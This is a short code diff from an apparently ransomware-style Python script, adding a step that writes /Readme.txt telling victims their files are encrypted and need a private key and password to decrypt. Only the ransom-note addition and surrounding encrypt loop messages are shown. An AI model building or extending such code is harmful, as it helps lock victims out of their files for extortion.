@@ -49,7 +49,11 @@ def encrypt():
             print("[#] Encrypted " + f)
         except Exception as e:
             print("[X] Failed to encrypt " + f + ": " + str(e))
-    print("[#] Encryption complete.")
+    print("[#] Encryption complete. Writing Readme.txt")
+    readme = open("/Readme.txt", "w")
+    readme.write("Your files have been encrypted. To decrypt them, you will need the private key and the password.\n")
+    readme.close()
+    print("[#] Readme.txt written.")
 def decrypt():
     print("[#] Reading private key file")
     try:
